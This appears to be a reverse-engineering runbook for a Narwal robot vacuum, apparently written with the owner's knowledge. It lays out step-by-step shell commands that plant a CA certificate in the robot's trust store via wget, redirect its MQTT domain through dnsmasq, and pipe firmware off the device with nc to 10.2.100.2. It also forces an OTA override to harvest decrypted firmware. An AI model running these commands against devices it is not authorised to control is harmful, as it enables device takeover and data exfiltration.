# Runbook — the post-cleaning window (2026-11-18, after ~11:35)

Everything staged; each step is one command. Robot currently: cleaning
(owner requested hands-off until ~11:35), on real cloud except us-open
→ emulator (serving NO-update), poll channel idle ("# no-op").

## A. Full offline MQTT (the big one)

1. Install the hash-named CA (the MQTT client uses
   ca_path="/etc/ssl/certs" — directory hash lookups only):
   ```
   cmd:  cd /etc/ssl/certs && wget -q http://10.2.100.2:8081/ca-33148072.0 && ls -la 33148072.0
   ```
2. Point MQTT at the offline broker (dnsmasq on VM):
   ```
   address=/us-01.mqtt.narwaltech.com/10.2.100.2
   local=/us-01.mqtt.narwaltech.com/
   ```
   (keep us-open override as-is; everything else real)
3. Force an MQTT reconnect (robot re-leases DNS on TTL; or reboot via
   cmd `reboot` — rc.local brings shell+poller back).
4. Watch: `tail -f /var/log/mosquitto-narwal-offline.log` for
   `New connection from 10.2.101.156` + `CONNECT` with client id
   `sweeper_*`. TLS = us-01.mqtt leaf (already staged in
   /etc/mosquitto/narwal-offline/).
5. If CONNECT: `python3 emulator/control.py --broker 10.2.100.2
   --device 0123456789abcdef0123456789abcdef status` = FULL OFFLINE.
   Rollback: rm /etc/ssl/certs/33148072.0 + revert DNS.

## B. Decrypted firmware harvest (no crypto fight)

1. `cmd: ls -laR /oem/DISK/bin/pita/firmware_back/ | head -50` — the
   upgrader log said this dir is "already parsed".
2. If it holds plaintext images: exfil via
   `/opt/exfil_once.sh PORT name` + `cmd: cat <file> | nc 10.2.100.2 PORT &`
   (one file per port; sizes verified by md5).
3. Also pull robokit_telemetry_node (bootstrap/us.device client — the
   last unknown TLS config) the same way.

## C. OTA oracle decrypt run (if B is thin)

1. Re-enable: `cp /root/ota_override.json.disabled /var/tmp/narwal_cap/ota_override.json`
   (forced response: v01.09.02.00 + real sign +
   https://us-open.narwaltech.com/fw/real.npkg — genuine package,
   robot-verified; install of genuine fw is safe/no-modification).
2. Watch emulator log for `GET /fw/real.npkg` (lenient-TLS retry may
   take a cycle or two; E2/E3 precedent) and the robot staging dirs:
   `cmd: ls -laR /userdata/usr/ota/; tail -5 /userdata/logs/upgrader/*.logging`
3. Harvest staged plaintext from /userdata/usr/ota/firmware_package/.

## Safety/rollback (all steps)

- rc.local: original at robot_dump/etc_rc.local.orig (write back via MQTT).
- CA additions: narwal_rootca.crt.orig + system bundle .bak in repo;
  hash-dir entry is a single new file (rm).
- DNS: revert = comment the address/local lines, restart dnsmasq,
  UDR dhcpd_dns_1 back to 10.2.100.1 + force-provision (mac
  8c:30:66:b4:1e:8d).
- The robot self-recovers cloud connectivity whenever DNS is reverted
  (verified repeatedly).
